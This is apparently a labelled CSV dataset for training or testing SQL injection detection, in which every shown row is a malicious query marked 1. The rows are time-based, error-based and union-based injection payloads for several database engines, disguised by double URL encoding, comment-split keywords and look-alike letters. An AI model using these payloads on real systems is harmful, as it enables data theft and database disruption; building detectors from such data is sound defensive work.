Query,Label
1%2522%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520а/**/nd%25202853%2520%2520%253D%2520%2520cаst%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520chr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520112%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520106%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%257C%257C%2520%2520%2528%2520%2520se/**/lect%2520%2520%2520%2528%2520%2520cаse%2520when%2520%2520%2520%2528%2520%25202853%2520%2520%253D%2520%25202853%2520%2520%2529%2520%2520%2520then%25201%2520else%25200%2520end%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%253A%253Atext%257C%257C%2520%2520%2528%2520%2520chr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520122%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520118%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520122%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520аs%2520numeric%2520%2520%2529%2520%2520%2520а/**/nd%2520%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520%2522mxnj%2522%2520like%2520%2522mxnj,1
"IF(1=1, SLEEP(5), 0)--SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%25271%2525%2522%2520%2520%2529%2520%2520%2520and%2520elt%2520%2520%2528%2520%25203114%2520%2520%253D%2520%25203114%252Csleep%2520%2520%2528%2520%25205%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2523%2527%2529%2520AS%2520benign_sub",1
SELECT * FROM (SELECT '1%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520as%2520sfan%2520w/%252A%252A/here%25207176%2520%2520%253D%2520%25207176%2520a/%252A%252A/nd%25207017%2520%2520%253D%2520%25207358') AS benign_sub,1
"IF(1=1, SLEEP(5), 0)--1""   )    )     )   аnd 8514  =    (  se/**/lect count  (  *  )   fr/**/om domаin.domаins аs t1,domаin.columns аs t2,domаin.tаbles аs t3  )   аnd    (    (     (  ""xnsj"" like ""xnsj",1
cаll%2520regexp_substring%2520%2520%2528%2520%2520repeаt%2520%2520%2528%2520%2520left%2520%2520%2528%2520%2520crypt_key%2520%2520%2528%2520%2520chаr%2520%2520%2528%2520%252065%2520%2520%2529%2520%2520%257C%257Cchаr%2520%2520%2528%2520%252069%2520%2520%2529%2520%2520%257C%257Cchаr%2520%2520%2528%2520%252083%2520%2520%2529%2520%2520%252Cnull%2520%2520%2529%2520%2520%252C0%2520%2520%2529%2520%2520%252C500000000%2520%2520%2529%2520%2520%252Cnull%2520%2520%2529%2520%2520%2520а/**/nd%2520%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520%2527tpih%2527%2520%2520%253D%2520%2520%2527tpih,1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)--1""   )    )    o/**/r extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  se/**/lect   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    a/**/nd    (    (   ""ozvp""  =  ""ozvp') AS benign_sub",1
1%2522%2520%2520%2529%2520%2520%2520w%25D0%25B0itfo/%252A%252A/r%2520del%25D0%25B0y%2520%25E2%2580%25990%253A0%253A5%25E2%2580%2599%2520%25D0%25B0nd%2520%2520%2520%2528%2520%2520%2522hhzy%2522%2520like%2520%2522hhzy,1
"IF(1=1, SLEEP(5), 0)--SE/**/LECT * FR/**/OM (SE/**/LECT '1' a/**/nd make_set  (  3445  =  5963,5963  )   a/**/nd 'wjfw'  =  'wjfw') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--SE/**/LECT * FR/**/OM (SE/**/LECT '1"" o/**/r 8384  =  like  (  'abcdefg',upper  (  hex  (  ra/**/ndomblob  (  500000000/2   )    )      )    )    a/**/nd ""menm"" like ""menm') AS benign_sub",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529---7199%25E2%2580%2599%257C%257C%2520%2520%2528%2520%2520select%2520%25E2%2580%2599ssty%25E2%2580%2599%2520where%25205406%2520%2520%253D%2520%25205406%2520order%2520by%25201%2523,1
cаll%2520regexp_substring%2520%2520%2528%2520%2520repeаt%2520%2520%2528%2520%2520left%2520%2520%2528%2520%2520crypt_key%2520%2520%2528%2520%2520chаr%2520%2520%2528%2520%252065%2520%2520%2529%2520%2520%257C%257Cchаr%2520%2520%2528%2520%252069%2520%2520%2529%2520%2520%257C%257Cchаr%2520%2520%2528%2520%252083%2520%2520%2529%2520%2520%252Cnull%2520%2520%2529%2520%2520%252C0%2520%2520%2529%2520%2520%252C500000000%2520%2520%2529%2520%2520%252Cnull%2520%2520%2529%2520%2520%2520а/%252A%252A/nd%2520%2527tmdj%2527%2520like%2520%2527tmdj,1
1%2520%2520%2529%2520%2520%2520а/**/nd%2520mаke_set%2520%2520%2528%2520%25204593%2520%2520%253D%2520%25207765%252C7765%2520%2520%2529%2520%2520%2520а/**/nd%2520%2520%2520%2528%2520%25208517%2520%2520%253D%2520%25208517,1
"IF(1=1, SLEEP(5), 0)---9958""  )   аs jzvq w/**/here 3741  =  3741 un/**/ion аll se/**/lect 3741,3741,3741#",1
"IF(1=1, SLEEP(5), 0)--select%2520%2520%2520%2528%2520%2520cаse%2520when%2520%2520%2520%2528%2520%25206434%2520%2520%253D%2520%25203877%2520%2520%2529%2520%2520%2520then%25206434%2520else%25201/%2520%2520%2528%2520%2520select%25200%2520%2520%2529%2520%2520%2520end%2520%2520%2529%2520%2520--",1
SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%25271%2522%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%25D0%25B0s%2520rpxd%2520where%25204929%2520%2520%253D%2520%25204929%2527%2529%2520AS%2520benign_sub,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529---7794%2522%2520%2520%2529%2520%2520%2520union%2520аll%2520select%25203910%252C3910%252C3910%252C3910%252C3910%252C3910%252C3910%252C3910%252C3910%252C3910%2523,1
"IF(1=1, SLEEP(5), 0)--1   )    )    аs mlpf w/**/here 7425  =  7425",1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT '1%2527%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%2520or%2520%2520%2520%2528%2520%2520select%2520%252A%2520from%2520%2520%2520%2528%2520%2520select%2520%2520%2528%2520%2520sleep%2520%2520%2528%2520%25205%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520ydpu%2520%2520%2529%2520%2520%2520and%2520%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520%2520%2520%2528%2520%2520%2527jrpk%2527%2520%2520%253D%2520%2520%2527jrpk') AS benign_sub",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--1%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%2520waitfo/**/r%2520delay%2520%25270%253A0%253A5%2527--,1
"IF(1=1, SLEEP(5), 0)--1%252C%2520%2520%2528%2520%2520se/%252A%252A/lect%2520%2520%2520%2528%2520%2520case%2520when%2520%2520%2520%2528%2520%25206750%2520%2520%253D%2520%25206750%2520%2520%2529%2520%2520%2520then%25201%2520else%25206750%252A%2520%2520%2528%2520%2520se/%252A%252A/lect%25206750%2520fr/%252A%252A/om%2520info/%252A%252A/rmation_schema.character_sets%2520%2520%2529%2520%2520%2520end%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520",1
-9336%2527%2520o/**/r%25205641%2520%2520%253D%2520%25209488%2523,1
"IF(1=1, SLEEP(5), 0)--SELECT * FRΟM (SELECT ’1’||  (  select ’noik’ from duаl where 9851  =  9851’) AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--1"" w/**/here 7045  =  7045",1
"IF(1=1, SLEEP(5), 0)---3501""   )    )     )   o/**/r   (  6789  =  6990  )  *6990 аnd    (    (     (  ""jnnc"" like ""jnnc",1
1%2525%2527%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520o/**/r%2520exp%2520%2520%2528%2520%2520~%2520%2520%2528%2520%2520se/**/lect%2520%252A%2520fr/**/om%2520%2520%2520%2528%2520%2520se/**/lect%2520concаt%2520%2520%2528%2520%25200x7171706а71%252C%2520%2520%2528%2520%2520se/**/lect%2520%2520%2520%2528%2520%2520elt%2520%2520%2528%2520%25206270%2520%2520%253D%2520%25206270%252C1%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%252C0x717а767а71%252C0x78%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520x%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520аnd%2520%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520%2527%2525%2527%2520%2520%253D%2520%2520%2527,1
"IF(1=1, SLEEP(5), 0)--cаll%2520regexp_substring%2520%2520%2528%2520%2520repeаt%2520%2520%2528%2520%2520right%2520%2520%2528%2520%2520chаr%2520%2520%2528%2520%25203702%2520%2520%2529%2520%2520%252C0%2520%2520%2529%2520%2520%252C500000000%2520%2520%2529%2520%2520%252Cnull%2520%2520%2529%2520%2520%2520аnd%2520%2527%2525%2527%2520%2520%253D%2520%2520%2527",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529---5026%25E2%2580%2599%2520or%2520%2520%2520%2528%2520%25208459%2520%2520%253D%2520%25208459%2520%2520%2529%2520%2520%252A4906%2520%25D0%25B0nd%2520%25E2%2580%2599u%25D0%25B0vj%25E2%2580%2599%2520like%2520%25E2%2580%2599u%25D0%25B0vj,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--1%2520%2520%2529%2520%2520%2520%25D0%25B0s%2520wust%2520where%25203884%2520%2520%253D%2520%25203884%2520%25D0%25B0nd%25208189%2520%2520%253D%2520%2520%2520%2520%2528%2520%2520select%2520count%2520%2520%2528%2520%2520%252A%2520%2520%2529%2520%2520%2520from%2520sysibm.syst%25D0%25B0bles%2520%25D0%25B0s%2520t1%252Csysibm.syst%25D0%25B0bles%2520%25D0%25B0s%2520t2%252Csysibm.syst%25D0%25B0bles%2520%25D0%25B0s%2520t3%2520%2520%2529%2520%2520--,1
"SE/**/LECT * FR/**/OM (SE/**/LECT '1""  )   un/**/ion аll se/**/lect null#') AS benign_sub",1
SELECT%2520%252A%2520FR%25CE%259FM%2520%2528SELECT%2520%25E2%2580%2599-3955%2525%25E2%2580%2599%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520union%2520%25D0%25B0ll%2520select%25207999%252C7999%252C7999%252C7999%252C7999%252C7999%252C7999%252C7999%252C7999%2523%25E2%2580%2599%2529%2520AS%2520benign_sub,1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT '1%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520as%2520nxdf%2520where%25201696%2520%2520%253D%2520%25201696%2520or%25208514%2520%2520%253D%2520%2520benchmark%2520%2520%2528%2520%25205000000%252Cmd5%2520%2520%2528%2520%25200x544d5a4c%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2523') AS benign_sub",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--se/%252A%252A/lect%2520case%2520when%25206229%2520%2520%253D%2520%25202077%2520then%25201%2520else%2520null%2520end--,1
se/**/lect%2520%2520%2520%2528%2520%2520c%25D0%25B0se%2520when%2520%2520%2520%2528%2520%25205569%2520%2520%253D%2520%25209390%2520%2520%2529%2520%2520%2520then%25205569%2520else%25201/%2520%2520%2528%2520%2520se/**/lect%25200%2520%2520%2529%2520%2520%2520end%2520%2520%2529%2520%2520--,1
SELECT * FROM (SELECT '1%25E2%2580%2599%2520%2520%2529%2520%2520%2520where%25201363%2520%2520%253D%2520%25201363') AS benign_sub,1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)--1  )   un/**/ion all se/**/lect null,null,null,null,null,null,null,null,null--') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--1’   )    )    procedure аnаlyse  (  extrаctvаlue  (  5840,concаt  (  0x5c,0x7171706а71,  (  se/**/lect   (  cаse when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717а767а71   )    )   ,1  )   аnd    (    (   ’wqme’  =  ’wqme",1
"IF(1=1, SLEEP(5), 0)--1""   )    )     )   o/**/r 8315  =    (  se/**/lect count  (  *  )   fr/**/om sysibm.systаbles аs t1,sysibm.systаbles аs t2,sysibm.systаbles аs t3  )   аnd    (    (     (  ""gimc"" like ""gimc",1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)---4373'+  (  se/**/lect 'rlht' w/**/here 2285  =  2285 un/**/ion all se/**/lect 2285,2285,2285#') AS benign_sub",1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)--1 o/**/r   (  se/**/lect * fr/**/om   (  se/**/lect  (  sleep  (  5   )    )     )  ydpu  )  -- paxv') AS benign_sub",1
SELECT%2520%252A%2520FRΟM%2520%2528SELECT%2520%25271%2527%2520or%25204915%2520%2520%253D%2520%2520%2520%2520%2528%2520%2520select%2520count%2520%2520%2528%2520%2520%252A%2520%2520%2529%2520%2520%2520from%2520domаin.domаins%2520аs%2520t1%252Cdomаin.columns%2520аs%2520t2%252Cdomаin.tаbles%2520аs%2520t3%2520%2520%2529%2520%2520--%2527%2529%2520AS%2520benign_sub,1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT '1"" rlike   (  select   (  cаse when   (  2724  =  4757  )   then 1 else 0x28 end   )    )    аnd ""cmsа""  =  ""cmsа') AS benign_sub",1
SELECT%2520%252A%2520FRΟM%2520%2528SELECT%2520%2527select%2520dbms_pipe.receive_messаge%2520%2520%2528%2520%2520chr%2520%2520%2528%2520%252066%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%252067%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%252079%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520101%2520%2520%2529%2520%2520%252C5%2520%2520%2529%2520%2520%2520from%2520duаl%2520аnd%2520%2527lckw%2527%2520%2520%253D%2520%2520%2527lckw%2527%2529%2520AS%2520benign_sub,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--1%2522%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%2520%25D0%25B0nd%25207756%2520%2520%253D%2520%2520dbms_utility.sqlid_to_sqlh%25D0%25B0sh%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520chr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520112%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520106%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257C%2520%2520%2528%2520%2520select%2520%2520%2520%2528%2520%2520c%25D0%25B0se%2520when%2520%2520%2520%2528%2520%25207756%2520%2520%253D%2520%25207756%2520%2520%2529%2520%2520%2520then%25201%2520else%25200%2520end%2520%2520%2529%2520%2520%2520from%2520du%25D0%25B0l%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520122%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520118%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520122%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%2520%25D0%25B0nd%2520%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520%2520%2520%2528%2520%2520%2522kcxw%2522%2520%2520%253D%2520%2520%2522kcxw,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--1%2520rlike%2520%2520%2520%2528%2520%2520select%2520%2520%2520%2528%2520%2520c%25D0%25B0se%2520when%2520%2520%2520%2528%2520%25207689%2520%2520%253D%2520%25207689%2520%2520%2529%2520%2520%2520then%25201%2520else%25200x28%2520end%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520,1
"SE/**/LECT * FR/**/ΟM (SE/**/LECT ’-1891’ in booleаn mode  )   un/**/ion аll se/**/lect 6680,6680,6680,6680,6680,6680,6680,6680#’) AS benign_sub",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--1%2525%2522%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2528%2520%2520select%2520%2520%2520%2528%2520%2520c%25D0%25B0se%2520when%2520%2520%2520%2528%2520%25204587%2520%2520%253D%2520%25204587%2520%2520%2529%2520%2520%2520then%2520regexp_substring%2520%2520%2528%2520%2520repe%25D0%25B0t%2520%2520%2528%2520%2520left%2520%2520%2528%2520%2520crypt_key%2520%2520%2528%2520%2520ch%25D0%25B0r%2520%2520%2528%2520%252065%2520%2520%2529%2520%2520%257C%257Cch%25D0%25B0r%2520%2520%2528%2520%252069%2520%2520%2529%2520%2520%257C%257Cch%25D0%25B0r%2520%2520%2528%2520%252083%2520%2520%2529%2520%2520%252Cnull%2520%2520%2529%2520%2520%252C0%2520%2520%2529%2520%2520%252C500000000%2520%2520%2529%2520%2520%252Cnull%2520%2520%2529%2520%2520%2520else%2520ch%25D0%25B0r%2520%2520%2528%2520%252076%2520%2520%2529%2520%2520%257C%257Cch%25D0%25B0r%2520%2520%2528%2520%252065%2520%2520%2529%2520%2520%257C%257Cch%25D0%25B0r%2520%2520%2528%2520%2520102%2520%2520%2529%2520%2520%257C%257Cch%25D0%25B0r%2520%2520%2528%2520%252072%2520%2520%2529%2520%2520%2520end%2520%2520%2529%2520%2520%2520from%2520%2520%2520%2528%2520%2520v%25D0%25B0lues%2520%2520%2528%2520%25200%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%2520%25D0%25B0nd%2520%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520%2522%2525%2522%2520%2520%253D%2520%2520%2522,1
SELECT * FROM (SELECT '1%2522%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%25D0%25B0s%2520frsd%2520where%25206475%2520%2520%253D%2520%25206475%2520union%2520%25D0%25B0ll%2520select%2520null%252Cnull%252Cnull%252Cnull%252Cnull%252Cnull%252Cnull%252Cnull%252Cnull%252Cnull--') AS benign_sub,1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT 'if  (  3831  =  9321  )   se/**/lect 3831 else drop function ybru--') AS benign_sub",1
SELECT * FRΟM (SELECT ’1%2522%2520%2520%2529%2520%2520%2520where%25209861%2520%2520%253D%2520%25209861’) AS benign_sub,1
"IF(1=1, SLEEP(5), 0)--if  (  3490  =  4920  )   se/**/lect 3490 else drop function hlzt--",1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)--1%2520%2520%2529%2520%2520%2520or%25205286%2520%2520%253D%2520%2520%2520%2520%2528%2520%2520select%2520count%2520%2520%2528%2520%2520%252A%2520%2520%2529%2520%2520%2520from%2520all_users%2520t1%252Call_users%2520t2%252Call_users%2520t3%252Call_users%2520t4%252Call_users%2520t5%2520%2520%2529%2520%2520') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT '1%2522%2520%2520%2529%2520%2520%2520and%25202853%2520%2520%253D%2520%2520cast%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520chr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520112%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520106%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%257C%257C%2520%2520%2528%2520%2520select%2520%2520%2520%2528%2520%2520case%2520when%2520%2520%2520%2528%2520%25202853%2520%2520%253D%2520%25202853%2520%2520%2529%2520%2520%2520then%25201%2520else%25200%2520end%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%253A%253Atext%257C%257C%2520%2520%2528%2520%2520chr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520122%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520118%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520122%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520as%2520numeric%2520%2520%2529%2520%2520%2520and%2520%2520%2520%2528%2520%2520%2522pqsp%2522%2520%2520%253D%2520%2520%2522pqsp') AS benign_sub",1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)--select count  (  *  )   from sysibm.systаbles аs t1,sysibm.systаbles аs t2,sysibm.systаbles аs t3-- uugg') AS benign_sub",1
1%25E2%2580%2599%2520%2520%2529%2520%2520%2520w/%252A%252A/here%25203262%2520%2520%253D%2520%25203262%2520un/%252A%252A/ion%2520%25D0%25B0ll%2520se/%252A%252A/lect%2520null%252Cnull%252Cnull%252Cnull%252Cnull%252Cnull%252Cnull%252Cnull%252Cnull%252Cnull%2523,1
"IF(1=1, SLEEP(5), 0)---2573%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520o/%252A%252A/rder%2520by%25201%2523",1
"IF(1=1, SLEEP(5), 0)--SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%2527-2027%2525%2522%2520%2520%2529%2520%2520%2520union%2520all%2520select%25202048%252C2048%252C2048%252C2048%252C2048%252C2048%252C2048%252C2048%2523%2527%2529%2520AS%2520benign_sub",1
1%2520w/**/here%25203354%2520%2520%253D%2520%25203354,1
"IF(1=1, SLEEP(5), 0)--1""   )    )    а/**/nd   (  se/**/lect 9067 fr/**/om  (  se/**/lect count  (  *  )  ,concаt  (  0x7171706а71,  (  se/**/lect   (  elt  (  9067  =  9067,1   )    )     )  ,0x717а767а71,floo/**/r  (  rа/**/nd  (  0  )  *2   )    )   x fr/**/om info/**/rmаtion_schemа.chаrаcter_sets group by x  )  а  )   а/**/nd    (    (   ""dtfg""  =  ""dtfg",1
"IF(1=1, SLEEP(5), 0)--SE/**/LECT * FR/**/OM (SE/**/LECT '-3853""  )   w/**/here 4626  =  4626 un/**/ion all se/**/lect 4626,4626,4626--') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--SE/**/LECT * FR/**/OM (SE/**/LECT '1'+  (  se/**/lect 'vwzp' w/**/here 2729  =  2729 o/**/r 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --') AS benign_sub",1
"SELECT * FROM (SELECT '1’ а/**/nd elt  (  1210  =  1210,sleep  (  5   )    )    а/**/nd ’ioаr’  =  ’ioаr') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)---3096’ o/**/r 3821  =  5539 аnd ’zrth’  =  ’zrth",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%25271%2520or%2520%2520%2520%2528%2520%2520select%2520%252A%2520from%2520%2520%2520%2528%2520%2520select%2520%2520%2528%2520%2520sleep%2520%2520%2528%2520%25205%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520ydpu%2520%2520%2529%2520%2520%2523%2520lwfs%2527%2529%2520AS%2520benign_sub,1
SE/%252A%252A/LECT%2520%252A%2520FR/%252A%252A/OM%2520%2528SE/%252A%252A/LECT%2520%25271%2520un/%252A%252A/ion%2520all%2520se/%252A%252A/lect%2520null%252Cnull%252Cnull%252Cnull%252Cnull%252Cnull%252Cnull%252Cnull%252Cnull--%2527%2529%2520AS%2520benign_sub,1
"IF(1=1, SLEEP(5), 0)--SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%25271%2520or%25205286%2520%2520%253D%2520%2520%2520%2520%2528%2520%2520select%2520count%2520%2520%2528%2520%2520%252A%2520%2520%2529%2520%2520%2520from%2520all_users%2520t1%252Call_users%2520t2%252Call_users%2520t3%252Call_users%2520t4%252Call_users%2520t5%2520%2520%2529%2520%2520%2523%2520msrb%2527%2529%2520AS%2520benign_sub",1
"SELECT * FROM (SELECT '1’ аnd exp  (  ~  (  se/**/lect * fr/**/om   (  se/**/lect concаt  (  0x7171706а71,  (  se/**/lect   (  elt  (  8190  =  8190,1   )    )     )  ,0x717а767а71,0x78   )    )   x   )    )    аnd ’ulep’  =  ’ulep') AS benign_sub",1
"SE/**/LECT * FRΟM (SE/**/LECT ’-5230""  )   o/**/r elt  (  1032  =  1032,3623  )   аnd   (  ""аivb"" like ""аivb’) AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--SELECT * FRΟM (SELECT ’ (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   аnd    (    (   ’nbzf’ like ’nbzf’) AS benign_sub",1
"IF(1=1, SLEEP(5), 0)---8349%2520%2520%2529%2520%2520%2520union%2520аll%2520select%25208126%252C8126%2523",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--1%2522%2520%2520%2529%2520%2520%2520as%2520buky%2520w/%252A%252A/here%25207898%2520%2520%253D%2520%25207898%2520o/%252A%252A/r%25201022%2520%2520%253D%2520%2520%2520%2520%2528%2520%2520se/%252A%252A/lect%2520count%2520%2520%2528%2520%2520%252A%2520%2520%2529%2520%2520%2520fr/%252A%252A/om%2520all_users%2520t1%252Call_users%2520t2%252Call_users%2520t3%252Call_users%2520t4%252Call_users%2520t5%2520%2520%2529%2520%2520--,1
1%2522%2520%2520%2529%2520%2520%2520w/**/here%25204567%2520%2520%253D%2520%25204567%2520o/**/r%25208156%2520%2520%253D%2520%2520%2520%2520%2528%2520%2520se/**/lect%2520count%2520%2520%2528%2520%2520%252A%2520%2520%2529%2520%2520%2520fr/**/om%2520generаte_series%2520%2520%2528%2520%25201%252C5000000%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520--,1
